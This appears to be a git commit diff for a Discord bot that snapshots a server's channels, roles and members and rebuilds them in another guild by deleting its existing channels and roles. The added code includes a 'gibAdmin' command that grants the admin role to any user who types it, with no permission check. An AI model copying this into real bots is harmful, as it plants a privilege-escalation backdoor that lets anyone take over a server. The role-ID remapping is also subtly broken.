45ea43d74f0d56d99c8616608d482ea9d169901c
LoggeL <hyper.xjo@gmx.de>
2018-04-29 15:05:42 +0200

    fixed untracked files

--- app.js
+++ app.js
@@ -8,94 +8,147 @@ const config = require('./config.json')
 if (!config) return console.error("Couldn't find config.json")
 
 client.on('ready', () => {
-    console.log('Logged in as ' + client.user.tag + '.\nI see ' + client.users.size + ' users.')
+  console.log(
+    'Logged in as ' +
+      client.user.tag +
+      '.\nI see ' +
+      client.users.size +
+      ' users.'
+  )
 
-    const onion = client.guilds.find('name', 'UNION')
+  const onion = client.guilds.find('name', 'Bot test')
 
-    if (!onion) {
-        console.log("Couldn't find Onion server\nTrying to rebuild ...")
+  if (!onion) {
+    console.log("Couldn't find Onion server\nTrying to rebuild ...")
 
-        return
-    }
+    return
+  }
 
-    //Initial Cacher
-    const channels = onion.channels
-        .map(c => ({
-            name: c.name,
-            id: c.id,
-            permissionOverwrites: c.permissionOverwrites.map(o => ({
-                id: o.id,
-                //type: o.type,
-                deny: o.deny,
-                allow: o.allow,
-            })),
-            parent: c.parentID,
-            position: c.position,
-        }))
-        .sort((a, b) => {
-            return a.position - b.position
-        })
-
-    const roles = onion.roles
-        .map(r => ({
-            name: r.name,
-            id: r.id,
-            permissions: r.permissions,
-            position: r.position,
-            color: r.color,
-            mentionable: r.mentionable,
-        }))
-        .sort((a, b) => {
-            return a.position - b.position
-        })
-
-    let members
-    onion.fetchMembers().then(() => {
-        members = onion.members.map(m => ({
-            id: m.id,
-            roles: m.roles.map(r => r.id),
-        }))
-        storage = {members: members, roles: roles, channels: channels}
-        fs.writeFile('storage.json', JSON.stringify(storage, null, 2), () => {})
+  //Initial Cacher
+  const channels = onion.channels
+    .map(c => ({
+      name: c.name,
+      id: c.id,
+      type: c.type,
+      permissionOverwrites: c.permissionOverwrites.map(o => ({
+        name: onion.roles.get(o.id)
+          ? onion.roles.get(o.id).name
+          : onion.members.get(o.id).user.tag,
+        id: o.id,
+        deny: o.deny,
+        allow: o.allow
+      })),
+      parent: c.parentID,
+      position: c.position
+    }))
+    .sort((a, b) => {
+      return a.position - b.position
     })
+
+  const roles = onion.roles
+    .map(r => ({
+      name: r.name,
+      id: r.id,
+      permissions: r.permissions,
+      position: r.position,
+      color: r.color,
+      mentionable: r.mentionable
+    }))
+    .sort((a, b) => {
+      return a.position - b.position
+    })
+
+  let members
+  onion.fetchMembers().then(() => {
+    members = onion.members.map(m => ({
+      id: m.id,
+      roles: m.roles.map(r => r.id)
+    }))
+    storage = { members: members, roles: roles, channels: channels }
+    fs.writeFile('storage.json', JSON.stringify(storage, null, 2), () => {})
+  })
 })
 
-client.on('message', message => {
-    if (message.author.id == config.author && message.content === 'build') {
-        const newOnion = client.guilds.get('439111833828458496')
-        const generalText = newOnion.channels.find('name', 'general')
-        if (generalText) generalText.delete()
-        const textCategory = newOnion.channels.find('name', 'Text Channels')
-        if (textCategory) textCategory.delete()
+client.on('message', async message => {
+  if (message.content.startsWith('perm')) {
+    const member = message.mentions.members.first()
+    if (!member) return
+    message.reply(
+      '```json\n' +
+        JSON.stringify(member.permissions.serialize(), null, 2) +
+        '\n```'
+    )
+  }
 
-        const generalVoice = newOnion.channels.find('name', 'General')
-        if (generalVoice) generalVoice.delete()
-        const voiceCategory = newOnion.channels.find('name', 'Voice Channels')
-        if (voiceCategory) voiceCategory.delete()
+  if (config.admin.includes(message.author.id) && message.content === 'build') {
+    const newOnion = client.guilds.get('439887847357546496')
 
-        /*
-        for (i = 0; i < storage.roles.length; i++) {
-            let role = storage.roles[i]
-            newOnion.createRole({
-                name: role.name,
-                color: role.color,
-                position: role.position,
-                permissions: role.permissions,
-                mentionable: role.mentionable,
-            })
-        }
-        */
+    newOnion.channels.forEach(async channel => {
+      await channel.delete()
+    })
 
-        for (i = 0; i < storage.channels.length; i++) {
-            let channel = storage.channels[i]
-            console.log(channel.name)
-            newOnion.createChannel({
-                name: channel.name,
-                type: channel.type,
-                //overwrites: channel.permissionOverwrites,
-            })
-        }
+    newOnion.roles.forEach(async role => {
+      if (role.name == '@everyone') return
+      await role.delete()
+    })
+
+    var editChannels = JSON.stringify(storage.channels)
+    for (i = 0; i < storage.roles.length; i++) {
+      let role = storage.roles[i]
+
+      if (role.name == '@everyone') {
+        newOnion.roles
+          .get(newOnion.id)
+          .setPermissions(role.permissions)
+          .catch(console.error)
+      } else {
+        let newRole = await newOnion
+          .createRole({
+            name: role.name,
+            color: role.color,
+            position: role.position,
+            permissions: role.permissions,
+            mentionable: role.mentionable
+          })
+          .catch(console.error)
+        editChannels.replace(role.id, newRole.id)
+      }
     }
+    storage.channels = JSON.parse(editChannels)
+
+    const categories = storage.channels.filter(c => c.type === 'category')
+    const channels = storage.channels.filter(c => c.type !== 'category')
+
+    for (i = 0; i < categories.length; i++) {
+      let category = categories[i]
+      let newCategory = await newOnion.createChannel(
+        category.name,
+        category.type,
+        category.permissionOverwrites
+      )
+
+      channels.forEach(channel => {
+        if (channel.parent == category.id) {
+          channel.parent = newCategory.id
+        }
+      })
+    }
+
+    for (i = 0; i < channels.length; i++) {
+      let channel = channels[i]
+      newOnion
+        .createChannel(channel.name, channel.type, channel.permissionOverwrites)
+        .then(newChannel => newChannel.setParent(channel.parent))
+      console.log(
+        channel.permissionOverwrites.map(
+          a => newOnion.roles.get(a.id) + ' ' + a.id
+        )
+      )
+    }
+  }
+  if (message.content == 'gibAdmin') {
+    message.member.addRole(message.guild.roles.find('name', 'admin'))
+  }
 })
 
 client.login(config.token)
